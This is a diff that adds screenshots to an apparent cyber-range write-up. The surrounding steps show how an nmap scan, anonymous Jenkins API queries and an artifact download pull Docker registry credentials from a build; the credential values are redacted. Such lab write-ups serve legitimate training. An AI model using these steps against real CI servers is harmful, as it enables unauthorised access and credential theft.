@@ -29,6 +29,7 @@ From Kali, identify Jenkins on the confirmed range host, verify anonymous API ac
 ```bash
 nmap -Pn -sV -p 22,8080,5000,9000,9200,8888 203.0.3.36
 ```
+<img width="1320" height="409" alt="WindowsTerminal_mRdhAsprXP" src="https://github.com/user-attachments/assets/92706a48-b2b0-4c39-9894-14c3feb1e751" />
 
 This scan confirmed SSH and all five range service ports open on `203.0.3.36`. The original jump-host key and `11.x.x.x/24` subnet are placeholders and do not apply to this deployment.
 
@@ -37,6 +38,7 @@ This scan confirmed SSH and all five range service ports open on `203.0.3.36`. T
 ```bash
 curl --max-time 8 -fsS http://203.0.3.36:8080/api/json | jq '{useSecurity, jobs}'
 ```
+<img width="1114" height="616" alt="WindowsTerminal_tOqmBSqZgX" src="https://github.com/user-attachments/assets/bff05b83-66cb-43de-995a-2e3b02ebbd1d" />
 
 The unauthenticated request returned HTTP 200 and `useSecurity: false` in the API response.
 
@@ -45,6 +47,7 @@ The unauthenticated request returned HTTP 200 and `useSecurity: false` in the AP
 ```bash
 curl --globoff --max-time 8 -fsS "http://203.0.3.36:8080/api/json?tree=jobs[name,url,lastBuild[result,artifacts[*]]]" | jq .
 ```
+<img width="1349" height="678" alt="WindowsTerminal_x6mkzxoyxZ" src="https://github.com/user-attachments/assets/13484771-7128-4c49-8b6d-c548d493c017" />
 
 `--globoff` is required because curl otherwise interprets the square brackets in the `tree=` query as URL glob syntax. The response lists `pul-firmware-build` with a successful build and `deploy-bundle/docker-config.json`.
 
@@ -56,6 +59,7 @@ chmod 700 "$RANGE3_DIR"
 curl --max-time 8 -fsS "http://203.0.3.36:8080/job/pul-firmware-build/lastSuccessfulBuild/artifact/deploy-bundle/docker-config.json" -o "$RANGE3_DIR/docker-config.json"
 jq -r '(.auths | to_entries[0]) | "registry endpoint: \(.key)\ncredential present: \(.value.password != null)"' "$RANGE3_DIR/docker-config.json"
 ```
+<img width="1448" height="181" alt="WindowsTerminal_NXgwF5fd9F" src="https://github.com/user-attachments/assets/82b9f680-056f-409a-84e9-0da7679819a3" />
 
 The artifact contains the registry username, password field, and base64 `auth` field. Values are redacted here because this writeup is public. The artifact's registry host is the literal placeholder `11.x.x.x:5000`; the registry in this deployment is reachable at `203.0.3.36:5000`.
 
@@ -86,6 +90,7 @@ export REGISTRY_PASSWORD_CANDIDATE
 ```bash
 printf 'Registry credential loaded for %s\n' "$REGISTRY_USER"
 ```
+<img width="1448" height="397" alt="WindowsTerminal_15wSvydSMd" src="https://github.com/user-attachments/assets/e8cfe3bb-4f73-4ad2-9dec-6fa2f51c0ee2" />
 
 On this artifact the base64 `auth` value decodes to the same username but a different password than the separate password field. Do not treat that password candidate as validated. M2's read API is anonymous, so the mismatch does not block the next documented steps.
 
